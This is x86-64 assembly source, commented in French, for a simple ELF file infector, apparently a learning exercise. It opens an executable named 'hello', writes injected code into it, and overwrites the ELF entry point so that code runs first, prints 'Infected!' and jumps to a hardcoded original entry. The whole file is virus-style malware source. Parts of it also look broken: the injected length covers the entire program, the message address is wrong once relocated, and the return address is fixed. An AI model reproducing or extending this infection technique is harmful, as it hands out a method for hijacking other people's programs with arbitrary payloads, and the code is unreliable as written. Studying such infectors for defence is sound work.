section .text
    global _start

shellcode:
    ; Affiche "Infected!"
    mov rax, 1              ; syscall: write
    mov rdi, 1              ; stdout
    lea rsi, [rel msg]      ; Adresse du message
    mov rdx, 9              ; Longueur du message
    syscall

    mov rax, 0x1060
    jmp rax

_start:

    ; Ouverture du fichier ELF en écriture
    mov rax, 2              ; syscall: open
    lea rdi, [rel filename] ; Nom du fichier
    mov rsi, 2              ; O_RDWR (lecture-écriture)
    xor rdx, rdx            ; Pas de flags supplémentaires
    syscall
    test rax, rax
    js exit_error
    mov r8, rax             ; Sauvegarde du file descriptor


    ; Positionner le curseur pour injecter le shellcode
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 4096 + 256     ; Offset 0x1100 dans le segment (0x1000 + 0x100)
    xor rdx, rdx
    syscall

    ; Écrire le shellcode
    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel shellcode]
    mov rdx, shellcode_len
    syscall

    ; Modifier l’entry point pour pointer vers 0x1100
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 24             ; Offset de l'entry point dans l'en-tête ELF
    xor rdx, rdx
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel new_entry]
    mov rdx, 8              ; Taille (8 octets pour ELF64)
    syscall

    ; Fermer le fichier et terminer
    mov rax, 3              ; syscall: close
    mov rdi, r8
    syscall

    mov rax, 60             ; syscall: exit
    xor rdi, rdi
    syscall

exit_error:
    mov rax, 60
    mov rdi, 1              ; Code d'erreur
    syscall

msg db "Infected!", 0
filename db "hello", 0
new_entry dq 0x1100           ; Nouvelle adresse virtuelle pour le shellcode
orig_entry dq 0
shellcode_len equ $ - shellcode

;debug_msg db "Returning to: ", 0
;debug_len equ $ - debug_msg